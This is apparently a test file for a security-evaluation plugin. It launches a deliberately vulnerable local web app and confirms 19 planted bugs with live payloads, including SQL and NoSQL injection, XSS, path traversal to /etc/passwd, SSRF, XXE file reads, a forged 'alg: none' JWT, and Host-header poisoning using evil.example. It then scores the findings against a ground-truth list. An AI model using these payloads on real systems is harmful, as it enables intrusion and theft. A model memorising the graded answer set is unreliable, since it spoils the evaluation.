import test from 'node:test';
import assert from 'node:assert/strict';
import { request as httpRequest } from 'node:http';
import { readFile } from 'node:fs/promises';
import { spawn } from 'node:child_process';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { score } from '../plugins/dsh-eval/index.js';

const HERE = dirname(fileURLToPath(import.meta.url));
const FIXTURE = join(HERE, '../plugins/dsh-eval/fixture-app.mjs');
const SECRET = join(HERE, '../plugins/dsh-eval/fixture-data/secret.txt');

function rawRequest(port, { method = 'GET', path = '/', headers = {}, body = '' } = {}) {
  return new Promise((resolve, reject) => {
    const req = httpRequest(
      { host: '127.0.0.1', port, method, path, headers },
      (res) => {
        const chunks = [];
        res.on('data', (d) => chunks.push(d));
        res.on('end', () => resolve({
          status: res.statusCode,
          headers: res.headers,
          body: Buffer.concat(chunks).toString('utf8'),
        }));
      },
    );
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

test('fixture confirms all 19 planted bugs and scores zero false positives', async () => {
  const truth = JSON.parse(await readFile(new URL('../plugins/dsh-eval/ground-truth.json', import.meta.url), 'utf8'));
  const port = 18100 + Math.floor(Math.random() * 500);
  const child = spawn(process.execPath, [FIXTURE, '--port', String(port)], { stdio: ['ignore', 'pipe', 'pipe'] });
  const secret = (await readFile(SECRET, 'utf8')).trim();
  try {
    const ready = await new Promise((resolve) => {
      const timer = setTimeout(() => resolve(false), 6000);
      child.stdout.on('data', (d) => {
        if (String(d).includes('listening')) {
          clearTimeout(timer);
          resolve(true);
        }
      });
      child.on('exit', () => {
        clearTimeout(timer);
        resolve(false);
      });
    });
    assert.equal(ready, true, 'fixture listens');

    const findings = [];
    const confirm = (bug, ok) => {
      assert.equal(ok, true, `${bug.id} ${bug.class}`);
      findings.push({ class: bug.class, path: bug.path, method: bug.method });
    };
    const bug = (id) => truth.bugs.find((b) => b.id === id);

    const idor = await rawRequest(port, { path: '/api/users/2' });
    const idorBody = JSON.parse(idor.body);
    confirm(bug('F1'), idor.status === 200 && idorBody.name === 'bob' && typeof idorBody.apiKey === 'string');

    const admin = await rawRequest(port, { path: '/admin/users' });
    confirm(bug('F2'), admin.status === 200 && JSON.parse(admin.body).users.length >= 2);

    const xss = await rawRequest(port, { path: '/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E' });
    confirm(bug('F3'), xss.body.includes('<img src=x onerror=alert(1)>'));

    const sqli = await rawRequest(port, { path: '/api/items?id=' + encodeURIComponent("1' OR 1=1--") });
    confirm(bug('F4'), JSON.parse(sqli.body).items.length >= 2);

    const redir = await rawRequest(port, { path: '/go?next=' + encodeURIComponent('https://evil.example/') });
    confirm(bug('F5'), redir.status === 302 && redir.headers.location === 'https://evil.example/');

    const trav = await rawRequest(port, { path: '/files?name=' + encodeURIComponent('../../etc/passwd') });
    confirm(bug('F6'), JSON.parse(trav.body).traversal === true);

    const ping = await rawRequest(port, { path: '/api/ping?delay=200' });
    confirm(bug('F7'), JSON.parse(ping.body).delayed_ms === 200);

    const ssrf = await rawRequest(port, { path: '/fetch?url=' + encodeURIComponent(`http://127.0.0.1:${port}/health`) });
    const ssrfBody = JSON.parse(ssrf.body);
    confirm(bug('F8'), ssrfBody.ssrf === true && String(ssrfBody.body).includes('bughive-eval-fixture'));

    const write = await rawRequest(port, {
      method: 'PUT',
      path: '/api/users/2',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email: 'attacker@example.test' }),
    });
    confirm(bug('F9'), JSON.parse(write.body).updated.email === 'attacker@example.test');

    const mass = await rawRequest(port, {
      method: 'POST',
      path: '/api/profile',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ role: 'admin' }),
    });
    confirm(bug('F10'), JSON.parse(mass.body).isAdmin === true);

    const ssti = await rawRequest(port, { path: '/render?name=' + encodeURIComponent('{{7*7}}') });
    confirm(bug('F11'), ssti.body.includes('49') && !ssti.body.includes('{{7*7}}'));

    const token = [
      Buffer.from(JSON.stringify({ alg: 'none', typ: 'JWT' })).toString('base64url'),
      Buffer.from(JSON.stringify({ role: 'admin' })).toString('base64url'),
      '',
    ].join('.');
    const jwt = await rawRequest(port, { path: '/api/admin/whoami', headers: { Authorization: `Bearer ${token}` } });
    confirm(bug('F12'), JSON.parse(jwt.body).trusted === true);

    const nosql = await rawRequest(port, { path: '/api/search?q[$ne]=x' });
    confirm(bug('F13'), JSON.parse(nosql.body).users.length >= 2);

    const cors = await rawRequest(port, { path: '/api/cors-me', headers: { Origin: 'https://evil.example' } });
    confirm(bug('F14'), cors.headers['access-control-allow-origin'] === 'https://evil.example' && cors.headers['access-control-allow-credentials'] === 'true');

    const host = await rawRequest(port, { method: 'POST', path: '/forgot-password', headers: { Host: 'evil.example' } });
    confirm(bug('F15'), JSON.parse(host.body).reset_link.startsWith('https://evil.example/'));

    const intro = await rawRequest(port, {
      method: 'POST',
      path: '/graphql',
      headers: { 'Content-Type': 'application/json' },
      body: '{"query":"{ __schema { types { name } } }"}',
    });
    const mutation = await rawRequest(port, {
      method: 'POST',
      path: '/graphql',
      headers: { 'Content-Type': 'application/json' },
      body: '{"query":"mutation { ok }"}',
    });
    confirm(
      bug('F16'),
      Boolean(JSON.parse(intro.body).data.__schema) && JSON.parse(mutation.body).data.note === 'mutation executed unauthenticated',
    );

    const raced = await Promise.all(
      Array.from({ length: 8 }, () => rawRequest(port, { method: 'POST', path: '/api/redeem?code=SAVE10' })),
    );
    const applied = raced.filter((r) => {
      try { return JSON.parse(r.body).applied === true; } catch { return false; }
    }).length;
    confirm(bug('F17'), applied >= 2);

    const xml = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://${SECRET}">]><r>&x;</r>`;
    const xxe = await rawRequest(port, {
      method: 'POST',
      path: '/api/import',
      headers: { 'Content-Type': 'application/xml' },
      body: xml,
    });
    confirm(bug('F18'), JSON.parse(xxe.body).content && JSON.parse(xxe.body).content.includes(secret));

    const cache = await rawRequest(port, { path: '/page?cb=poison', headers: { 'X-Forwarded-Host': 'evil.example' } });
    const cacheBody = JSON.parse(cache.body);
    confirm(bug('F19'), cacheBody.variant === 'poison' && cacheBody.reflected_header === 'evil.example');

    const health = JSON.parse((await rawRequest(port, { path: '/health' })).body);
    const version = JSON.parse((await rawRequest(port, { path: '/api/version' })).body);
    const login = await rawRequest(port, { path: '/login' });
    const js = await rawRequest(port, { path: '/static/app.js' });
    assert.equal(health.ok, true);
    assert.equal(version.version, '1.0.0');
    assert.match(login.body, /<form/);
    assert.match(js.body, /fixture client/);

    const scored = score(findings, truth);
    assert.equal(findings.length, 19);
    assert.equal(scored.tp, 19);
    assert.equal(scored.fp, 0);
    assert.equal(scored.fn, 0);
    assert.equal(scored.precision, 1);
    assert.equal(scored.recall, 1);
  } finally {
    child.kill();
  }
});
